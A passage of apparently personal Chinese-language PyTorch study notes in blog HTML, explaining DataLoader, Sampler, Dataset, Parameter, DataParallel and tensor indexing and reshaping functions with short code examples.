batch_sampler:将sampler生成的indices打包分组，得到一个又一个batch的index</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, dataset, batch_size=<span class="number">1</span>, shuffle=<span class="literal">False</span>, sampler=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">batch_sampler=<span class="literal">None</span>, num_workers=<span class="number">0</span>, collate_fn=default_collate,</span></span><br><span class="line"><span class="params">pin_memory=<span class="literal">False</span>, drop_last=<span class="literal">False</span>, timeout=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">worker_init_fn=<span class="literal">None</span></span>)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于DataLoader主要是为了迭代读取，所以只需要定义next和iter，iter用来构建迭代对象</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line"><span class="comment"># num_worker简单理解就是并行读取数据，这里为了简单简化了</span></span><br><span class="line"><span class="keyword">if</span> self.num_workers == <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取index的方式有多种，有按顺序的，也有乱序的，所以这个工作需要Sampler完成，</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DataLoader和Sampler在这里产生关系</span></span><br><span class="line">indices = <span class="built_in">next</span>(self.sampler_iter) <span class="comment"># Sampler，获取采样中指定数量的图片，读取数据就只需要对应的index即可</span></span><br><span class="line">batch = self.collate_fn([self.dataset[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices]) <span class="comment"># Dataset， 拿到了index就可以使用Dataset进行样本读取</span></span><br><span class="line"><span class="keyword">if</span> self.pin_memory: <span class="comment"># True时，Pytorch会采取一系列操作把数据拷贝到GPU，总之就是为了加速。</span></span><br><span class="line">batch = _utils.pin_memory.pin_memory_batch(batch)</span><br><span class="line"><span class="keyword">return</span> batch</span><br></pre></td></tr></table></figure><p>((6258f20b-fc4d-4e0e-8fd4-9cbd2ddfb82b))的作用就是将一个batch的数据进行合并操作。</p><h2 id="Sampler"><a href="#Sampler" class="headerlink" title="Sampler"></a>Sampler</h2><blockquote><p>Sampler返回的是样本的index（位置信息）</p></blockquote><p>Pytorch已经实现的Sampler有如下几种：<br>[[SequentialSampler]]<br>[[RandomSampler]]<br>[[WeightedRandomSampler]]<br>[[SubsetRandomSampler]]</p><blockquote><p>Sampler是对数据集的采样操作，而<a href="https://www.notion.so/BatchSampler-1ee7eccb9ec44ff784eae15a3caa1a71">BatchSampler</a>将Sampler生成的index按照指定的batch size分组，返回的结果是以组为单位的index list。</p></blockquote><p>⚠️ BatchSampler是实现Batch的关键！BatchSampler与其他Sampler的主要区别是它需要将Sampler作为参数进行打包，进而每次迭代返回以batch size为大小的index列表。也就是说在后面的读取数据过程中使用的都是batch sampler。</p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 所有Sampler都需要继承该父类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sampler</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="string">r&quot;&quot;&quot;Base class for all Samplers.</span></span><br><span class="line"><span class="string">Every Sampler subclass has to provide an :meth:`__iter__` method, providing a</span></span><br><span class="line"><span class="string">way to iterate over indices of dataset elements, and a :meth:`__len__` method</span></span><br><span class="line"><span class="string">that returns the length of the returned iterators.</span></span><br><span class="line"><span class="string">.. note:: The :meth:`__len__` method isn&#x27;t strictly required by</span></span><br><span class="line"><span class="string">:class:`~torch.utils.data.DataLoader`, but is expected in any</span></span><br><span class="line"><span class="string">calculation involving the length of a :class:`~torch.utils.data.DataLoader`.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_source</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不同的Sampler方法主要是在这里构建不同的可迭代对象。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 例如SequentialSampler返回的是iter(range(len(self.data_source)))</span></span><br><span class="line"><span class="keyword">raise</span> NotImplementedError</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">len</span>(self.data_source)</span><br></pre></td></tr></table></figure><blockquote><p>通常会使用BatchSampler来进行Batch化。</p></blockquote><blockquote></blockquote><p>这里以SequentialSampler采样为例，进行BatchSampler：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">in</span> : <span class="built_in">list</span>(BatchSampler(SequentialSampler(<span class="built_in">range</span>(<span class="number">10</span>)), batch_size=<span class="number">3</span>, drop_last=<span class="literal">False</span>))</span><br><span class="line">&gt;&gt;&gt;out: [[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>], [<span class="number">9</span>]]</span><br></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>DataLoader的部分初始化参数之间存在互斥关系</p><ol><li>如果你自定义了batch_sampler,那么这些参数都必须使用默认值：batch_size, shuffle,sampler,drop_last.</li><li>如果你自定义了sampler，那么shuffle需要设置为False</li><li>如果sampler和batch_sampler都为None,那么batch_sampler使用Pytorch已经实现好的BatchSampler,而sampler分两种情况：</li><li>若shuffle&#x3D;True,则sampler&#x3D;RandomSampler(dataset)</li><li>若shuffle&#x3D;False,则sampler&#x3D;SequentialSampler(dataset)</li></ol><h2 id="DataSet"><a href="#DataSet" class="headerlink" title="DataSet"></a>DataSet</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dataset</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于Sampler会对数据进行采样，所以这里就需要按指定位置来读取样本，所以就需要getitem，而不是next</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line"><span class="keyword">return</span> ... <span class="comment"># 规定了如何读取数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> ...</span><br></pre></td></tr></table></figure><blockquote><p>getitem的主要作用是能让该类可以像list一样通过索引值对数据进行访问。</p></blockquote><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>假如你定义好了一个dataset，那么你可以直接通过dataset[0]来访问第一个数据。在此之前我一直没弄清楚__getitem__是什么作用，所以一直不知道该怎么进入到这个函数进行调试。现在如果你想对__getitem__方法进行调试，你可以写一个for循环遍历dataset来进行调试了，而不用构建dataloader等一大堆东西了，建议学会使用ipdb这个库，非常实用！！！以后有时间再写一篇ipdb的使用教程。另外，其实我们通过最前面的Dataloader的__next__函数可以看到DataLoader对数据的读取其实就是用了for循环来遍历数据。</p><h2 id="Tensor"><a href="#Tensor" class="headerlink" title="Tensor"></a>Tensor</h2><blockquote><p>其实就是具备GPU加速功能的numpy</p></blockquote><h3 id="Variable"><a href="#Variable" class="headerlink" title="Variable"></a>Variable</h3><p>Variable是对Tensor的封装，从Pytorch1.0开始，Variable就已经被取消了，其实就是将Variable的功能集成到了Tensor里。这里介绍的Variable，相当于就是Tensor对numpy的扩充部分。<br><strong>Variable三元素:</strong></p><ol><li>Tensor: 数据部分</li><li>grad:Tensor的梯度</li><li>grad_fn:  以何种方式得到这种梯度<br>计算图就是建立在Variable这个数据结构之上的，方便神经网络的构建。 Pytorch默认做完一次自动求导之后就会丢弃计算图，所以在没有使用retain_graph的时候，只能使用一次backward，第二次使用就会报错(因为grad_fn其实就不存在了，没有计算图了怎么还会有如何计算)。</li></ol><h3 id="Parameter"><a href="#Parameter" class="headerlink" title="Parameter"></a>Parameter</h3><p>这里以最直观的梯度下降更新网络参数为例，展示参数更新过程:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w.data = w.data lr * w.grad.data  <span class="comment"># lr 是学习率</span></span><br></pre></td></tr></table></figure><p><strong>Variable主要是为了解决计算图构建问题，但是它的性质导致其无法作为网络的参数:</strong></p><ol><li>Variable默认是不需要计算梯度的，需要手动设置参数requires_grad&#x3D;True</li><li>Pytorch默认只计算一次计算图就丢弃，这就导致Variable容易被丢弃，在backward的时候还需要手动设置参数w.backward(retrain_grad&#x3D;True)来保持计算图。</li><li>网络中若是有100个参数，都要手写更新代码吗？1000个呢？10000个呢</li></ol><p><strong>Pytorch引入nn.Parameter类型和optimizer机制来解决。创建parameter的方式:</strong></p><ol><li>我们可以直接将**模型的成员变量(**self. )通过nn.Parameter() 创建，会自动注册到parameters中，可以通过model.parameters() 返回，并且这样创建的参数会自动保存到OrderDict中去;</li><li>通过nn.Parameter()创建普通的Parameter对象，不作为模型的成员变量，然后将Parameter对象通过register_parameter()进行注册，这个时候也会保存到到网络的parameters()对象里。<br>Parameter是Variable的子类，默认是需要求梯度的。网络net中的所有parameter变量都可以通过net.parameters()来进行访问，这样的好处就是不需要手动为每个参数都写更新代码，只需要使用parameter就行了。 只需将网络中所有需要训练更新的参数定义为Parameter类型，再佐以optimizer，就能够完成所有参数的更新了。</li></ol><h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Net</span>(<span class="title class_ inherited__">Module</span>):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, ...</span>):</span><br><span class="line"><span class="built_in">super</span>(net, self).__init__()</span><br><span class="line">self...   <span class="comment">#  parameters</span></span><br><span class="line">self...    <span class="comment"># layers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self</span>):</span><br><span class="line">x = ...</span><br><span class="line">x = ...    <span class="comment"># 数据流</span></span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line">net = Net(a, b, ...)</span><br><span class="line">net.train()</span><br><span class="line">...</span><br><span class="line">optimizer = torch.optim.SGD(net.parameters(), lr=<span class="number">1e-1</span>)</span><br></pre></td></tr></table></figure><blockquote><p>在每一次batch操作中，只需要在每次loss.backward()之后调用optimizer.step()就可以完成参数的更新。</p></blockquote><h4 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h4><p>需要注册，通过注册才能被网络跟踪，可以通过state_dict读取，保存到OrderDict里。</p><h3 id="named-parameters"><a href="#named-parameters" class="headerlink" title="named_parameters()"></a>named_parameters()</h3><p>会同时给出网络层的名字和参数的字典，而parameters()只会给出参数(权重)。</p><h3 id="buffer"><a href="#buffer" class="headerlink" title="buffer"></a>buffer</h3><p>与parameter对应，parameter是网络中需要进行更新的参数，而buffer是不需要更新的参数。<br>buffer与parameter的异同:</p><ol><li>都需要通过等级才能通过model.state_dict()查看，parameter通过register_parameter登记，buffer通过register_buffer进行登记</li><li>buffer其实就是requires_grad&#x3D;False，但是为了更方便总体使用，所以进行不同的封装。</li></ol><h3 id="归并运算"><a href="#归并运算" class="headerlink" title="归并运算"></a>归并运算</h3><p>与numpy对应，只是参数的名字不一样，在numpy中用axis指定的维度在tensor中使用dim表示。<br>dim：指定的维度会被聚合<br>keepdim：默认False。表示不保留聚合的维度，True会保留维度为1。</p><table><thead><tr><th>Name</th><th>功能</th></tr></thead><tbody><tr><td>mean&#x2F;sum&#x2F;median&#x2F;mode</td><td>均值&#x2F;和&#x2F;中位数&#x2F;众数</td></tr><tr><td>norm&#x2F;dist</td><td>范数&#x2F;距离</td></tr><tr><td>std&#x2F;var</td><td>标准差&#x2F;方差</td></tr><tr><td>cumsum&#x2F;cumprod</td><td>累加&#x2F;累乘</td></tr><tr><td>numel</td><td>返回元素数目</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="DataParallel"><a href="#DataParallel" class="headerlink" title="DataParallel"></a>DataParallel</h2><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650003096867_0.png" alt="image.png"><br>上图中并没有将opitmizer封装到DataParallel里，这是由于每次前向传播的时候都会分发模型，用不着反向传播时将梯度loss分发到各个GPU单独计算梯度，在进行合并的操作。<br>可以就在主GPU上根据总loss更新模型的梯度，并且不用同步其他GPU上的模型，因为前向传播的时候会分发模型。</p><blockquote><p>DataParallel是没有完成对GPU的调用的，需要手动cuda上去。</p></blockquote><h3 id="基础示例"><a href="#基础示例" class="headerlink" title="基础示例"></a>基础示例</h3><p>在进行多ＧＰＵ训练的场景，PyTorch通常使用nn.DataParallel来包装网络模型，它会将模型在每张卡上都复制一份，从而实现并行训练。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">device_ids = [<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">net = torch.nn.DataParallel(net, device_ids = device_ids)</span><br></pre></td></tr></table></figure><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>DataParallel会导致其中一块卡的显存占用高于其他块。<br>容易导致负载不均衡，这个时候就需要将loss分配的到多个GPU上进行计算，然后使用loss.mean or loss.sum等方式进行归并。这样主GPU只会多一点占用。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLASS torch.nn.DataParallel(module, device_ids=<span class="literal">None</span>, output_device=<span class="literal">None</span>, dim=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>module:需要并行计算的模型<br>device_ids:可用ＧＰＵ<br>output_device:当调用nn.DataParallel的时候，只是在input数据是并行的，但是output loss却不是这样的，每次都会在第一块GPU相加计算。这里默认是device_ids[0]<br>dim:对数据进行分割的维度<br>由于DataParallel的设计，导致在运行DataParallel模块之前，并行化模块必须在device_ids[0]上具有其参数和缓冲区,如果不想占用多余的卡就需要设置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os.environ[<span class="string">&quot;CUDA_DEVICE_ORDER&quot;</span>] = <span class="string">&quot;PCI_BUS_ID&quot;</span></span><br><span class="line">os.environ[<span class="string">&quot;CUDA_VISIBLE_DEVICES&quot;</span>] = <span class="string">&quot;2, 3&quot;</span></span><br></pre></td></tr></table></figure><p>使得网络在识别的时候，只识别这２张卡，２卡就会成为第一张卡来存储DataParallel的缓冲区。</p><h3 id="DataParallel-CODE"><a href="#DataParallel-CODE" class="headerlink" title="DataParallel CODE"></a>DataParallel CODE</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, *<span class="built_in">input</span>, **kwargs</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> self.device_ids:</span><br><span class="line"><span class="keyword">return</span> self.module(*inputs, **kwargs)</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> chain(self.module.parameters(), self.module.buffers()):</span><br><span class="line"><span class="keyword">if</span> t.device != self.src_device_obj:</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;模型必须在设备&#123;&#125;(device_ids[0])上有它</span></span><br><span class="line"><span class="string">的参数和缓冲区，但是找到的设备是&#123;&#125;&#x27;</span>.formot(self.src_device_obj, t.device))</span><br><span class="line">inputs, kwargs = self.scatter(inputs, kwargs, self.device_ids)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(self.device_ids) == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span> self.module(*inputs[<span class="number">0</span>], **kwargs[<span class="number">0</span>])</span><br><span class="line">replicas = self.replicate(self.module, self.device_ids[:<span class="built_in">len</span>(inputs)])</span><br><span class="line">outputs = self.parallel_apply(replicas, inputs, kwargs)</span><br><span class="line"><span class="keyword">return</span> self.gather(outputs, self.output_device)</span><br></pre></td></tr></table></figure><p>src_device_obj:第一张卡，默认为device_ids[0]<br><strong>其中涉及到了４个方法：</strong><br>scatter:将输入数据及参数均分到每张卡上<br>replicate:将模型复制一份(注意：卡上必须有scatter分割的数据存在！)<br>parallel_apply:每张卡并行计算结果，这里会调用被包装的具体模型的前向反馈操作<br>gather:将每张卡的计算结果统一汇聚到主卡</p><h1 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h1><h2 id="gather"><a href="#gather" class="headerlink" title="gather"></a>gather</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.gather(<span class="built_in">input</span>, dim, index, out=NOne)-&gt;Tensor</span><br></pre></td></tr></table></figure><p>沿着给定的轴dim，对输入索引张量index指定位置的值进行聚合。其实就是只有指定的维度上使用到了index上的值。<br>对一个三维张量，输出可以定义为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#空格是为了好看一点</span></span><br><span class="line">out[i][j][k] = <span class="built_in">input</span>[index[i][j][k]]  [j]  [k] <span class="comment"># dim==0</span></span><br><span class="line">out[i][j][k] = <span class="built_in">input</span>[i]  [index[i][j][k]]  [k] <span class="comment"># dim==1</span></span><br><span class="line">out[i][j][k] = <span class="built_in">input</span>[i]  [j]  [index[i][j][k]] <span class="comment"># dim==2</span></span><br></pre></td></tr></table></figure><p>可以看出index的形状需要和out相同。<br>同时还要注意：<strong>除了指定的维度的长度外，其他维度的长度必须相同才能执行，否则会报错，同时i j k是按照index能够取得的范围来定的。</strong></p><h2 id="collate-fn"><a href="#collate-fn" class="headerlink" title="collate_fn"></a>collate_fn</h2><p>id:: 6258f20b-fc4d-4e0e-8fd4-9cbd2ddfb82b<br>默认的collate_fn是将img和label分别合并成imgs和labels，所以如果你的__getitem__方法只是返回 img, label,那么你可以使用默认的collate_fn方法，但是如果你每次读取的数据有img, box, label等等，那么你就需要自定义collate_fn来将对应的数据合并成一个batch数据，这样方便后续的训练步骤。</p><h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">batch = self.collate_fn([self.dataset[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices])</span><br></pre></td></tr></table></figure><p>以上式为例：</p><ol><li>indices: 表示每一个iteration，sampler返回的indices，即一个batch size大小的索引列表</li><li>self.dataset[i]: 前面已经介绍了，这里就是对第i个数据进行读取操作，一般来说self.dataset[i]&#x3D;(img, label)<blockquote><p>拼接应该就是通过这个函数完成的，但是indices的获取应该还是BatchSampler的作用，所以它们是不冲突的，BatchSampler获取一个batch的index之后，在这里进行样本对象的拼接。</p></blockquote></li></ol><h2 id="维度变换"><a href="#维度变换" class="headerlink" title="维度变换"></a>维度变换</h2><p>因为在训练时的数据维度一般都是 (batch_size, c, h, w)，而在测试时只输入一张图片，所以需要扩展维度。</p><h1 id="view"><a href="#view" class="headerlink" title="view"></a>view</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">image = cv2.imread(img_path)</span><br><span class="line">image = torch.tensor(image)</span><br><span class="line"><span class="built_in">print</span>(image.size())</span><br><span class="line">img = image.view(<span class="number">1</span>, *image.size())</span><br><span class="line"><span class="built_in">print</span>(img.size())</span><br><span class="line"></span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># torch.Size([h, w, c])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># torch.Size([1, h, w, c])</span></span><br></pre></td></tr></table></figure><h1 id="numpy-newaxis"><a href="#numpy-newaxis" class="headerlink" title="numpy.newaxis"></a>numpy.newaxis</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">image = cv2.imread(img_path)</span><br><span class="line"><span class="built_in">print</span>(image.shape)</span><br><span class="line">img = image[np.newaxis, :, :, :]</span><br><span class="line"><span class="built_in">print</span>(img.shape)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (h, w, c)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (1, h, w, c)</span></span><br></pre></td></tr></table></figure><h1 id="unsqueeze"><a href="#unsqueeze" class="headerlink" title="unsqueeze"></a>unsqueeze</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">image = cv2.imread(img_path)</span><br><span class="line">image = torch.tensor(image)</span><br><span class="line"><span class="built_in">print</span>(image.size())</span><br><span class="line">img = image.unsqueeze(dim=<span class="number">0</span>)  </span><br><span class="line"><span class="built_in">print</span>(img.size())</span><br><span class="line">img = img.squeeze(dim=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(img.size())</span><br><span class="line"></span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># torch.Size([(h, w, c)])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># torch.Size([1, h, w, c])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># torch.Size([h, w, c])</span></span><br></pre></td></tr></table></figure><h2 id="torchvision-models"><a href="#torchvision-models" class="headerlink" title="torchvision.models"></a>torchvision.models</h2><p>内置了多个模型和其权重：<br>AlexNet<br>VGG<br>ResNet<br>SqueezeNet<br>DenseNet</p><h2 id="查看部分样本信息"><a href="#查看部分样本信息" class="headerlink" title="查看部分样本信息"></a>查看部分样本信息</h2><h3 id="torch-index-select"><a href="#torch-index-select" class="headerlink" title="torch.index_select()"></a>torch.index_select()</h3><p>用于索引给定张量中某一个维度中元素的方法，其API手册如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">torch.index_select(<span class="built_in">input</span>, dim, index, out=<span class="literal">None</span>) → Tensor</span><br><span class="line">Parameters: </span><br><span class="line"><span class="built_in">input</span> (Tensor) – 输入张量，需要被索引的张量</span><br><span class="line">dim (<span class="built_in">int</span>) – 在某个维度被索引</span><br><span class="line">index (LongTensor) – 一维张量，用于提供索引信息</span><br><span class="line">out (Tensor, optional) – 输出张量，可以不填</span><br></pre></td></tr></table></figure><p>其作用很简单，比如我现在的输入张量为1000 * 10的尺寸大小，其中1000为样本数量，10为特征数目，如果我现在需要<strong>指定的某些样本</strong>，比如第1-100,300-400等等样本，我可以用一个<strong>index进行索引</strong>，然后应用torch.index_select()就可以索引了，例子如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = torch.randn(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line">tensor([[ <span class="number">0.1427</span>,  <span class="number">0.0231</span>, -<span class="number">0.5414</span>, -<span class="number">1.0009</span>],</span><br><span class="line">[-<span class="number">0.4664</span>,  <span class="number">0.2647</span>, -<span class="number">0.1228</span>, -<span class="number">1.1068</span>],</span><br><span class="line">[-<span class="number">1.1734</span>, -<span class="number">0.6571</span>,  <span class="number">0.7230</span>, -<span class="number">0.6004</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>indices = torch.tensor([<span class="number">0</span>, <span class="number">2</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.index_select(x, <span class="number">0</span>, indices) <span class="comment"># 按行索引</span></span><br><span class="line">tensor([[ <span class="number">0.1427</span>,  <span class="number">0.0231</span>, -<span class="number">0.5414</span>, -<span class="number">1.0009</span>],</span><br><span class="line">[-<span class="number">1.1734</span>, -<span class="number">0.6571</span>,  <span class="number">0.7230</span>, -<span class="number">0.6004</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.index_select(x, <span class="number">1</span>, indices) <span class="comment"># 按列索引</span></span><br><span class="line">tensor([[ <span class="number">0.1427</span>, -<span class="number">0.5414</span>],</span><br><span class="line">[-<span class="number">0.4664</span>, -<span class="number">0.1228</span>],</span><br><span class="line">[-<span class="number">1.1734</span>,  <span class="number">0.7230</span>]])</span><br></pre></td></tr></table></figure><blockquote><p>注意：pytorch似乎在使用GPU的情况下，不检查index是否会越界，因此如果你的index越界了，但是报错的地方可能不在使用index_select()的地方，而是在后续的代码中，这个似乎就需要留意下你的index了。同时，index是一个LongTensor，这个也是要留意的。</p></blockquote><h2 id="torchvision"><a href="#torchvision" class="headerlink" title="torchvision"></a>torchvision</h2><h3 id="ops"><a href="#ops" class="headerlink" title="ops"></a>ops</h3><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>batched_nms</td><td>根据每个类别进行过滤，只对同一种类别进行计算IOU和阈值过滤</td></tr><tr><td>nms</td><td>不区分类别对所有bbox进行过滤。如果有不同类别的bbox重叠的话会导致被过滤掉并不会分开计算。</td></tr></tbody></table><h2 id="ray"><a href="#ray" class="headerlink" title="ray"></a>ray</h2><blockquote><p>基于 Python 的分布式计算框架，采用动态图计算模型。使用起来很方便可通过装饰器的方式，仅需修改极少的的代码，让原本运行在单机的 Python 代码轻松实现分布式计算。目前多用于机器学习方面</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ray</span><br><span class="line">ray.<span class="built_in">init</span>()</span><br><span class="line">@ray.<span class="function">remote</span></span><br><span class="line"><span class="function">def <span class="title">f</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="function">return x * x</span></span><br><span class="line"><span class="function">futures =</span> [f.<span class="built_in">remote</span>(i) <span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">4</span>)</span>]</span></span><br><span class="line"><span class="function"><span class="title">print</span><span 